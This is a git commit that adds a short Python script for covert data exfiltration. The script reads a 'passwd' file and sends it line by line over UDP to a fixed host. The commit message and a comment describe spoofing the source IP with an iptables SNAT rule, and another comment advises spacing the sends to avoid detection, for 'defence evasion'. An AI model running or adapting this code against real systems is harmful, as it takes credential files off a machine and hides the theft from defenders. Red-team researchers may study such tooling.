c1a4b58e86a5ad6be996d2592f15a18d610eac1a
Aqeeb <aqeeb@aqeeb.com>
2021-12-03 03:06:50 +0000

    Using asymmetric routing, possible to spoof source IP via SNAT/IPTables. Use this with UDP exfiltration channel for defence evasion

---
+++ code/exfiltration/ip-spoof-exfil.py
@@ -0,0 +1,40 @@
+import socket
+import time
+
+# sudo iptables -A POSTROUTING -t nat -j SNAT --to (IP to spoof) -o (exit interface)
+def process_file(target_file):
+	with open(target_file) as fp:
+		# Each line is one element as we want.
+		line_list = fp.read().splitlines()
+	
+	return line_list
+
+# The ip of the machine/interface
+exfil_ip = "192.168.0.70"
+# This can be random
+exfil_port = 5000
+# The file you want to exfil
+lines = process_file('passwd')
+
+# Make one socket only 
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+for line in lines:
+        print(line)
+	# Send this data through the wire as bytes and catch it on the other end with sniffer.
+        sock.sendto(bytes(line, "utf-8"), (exfil_ip, exfil_port))
+	# Randomise these to prevent a steady pattern of data, might look suss.
+        time.sleep(10)
+
+"""
+UDP_IP = "192.168.0.70"
+UDP_PORT = 5000
+MESSAGE = "Hello, World!"
+
+print("UDP target IP:", UDP_IP)
+#print("UDP target port:", UDP_PORT)
+print("message:", MESSAGE)
+
+# We only want one of these socekts. 
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+sock.sendto(bytes(MESSAGE, "utf-8"), (UDP_IP, UDP_PORT))
+"""
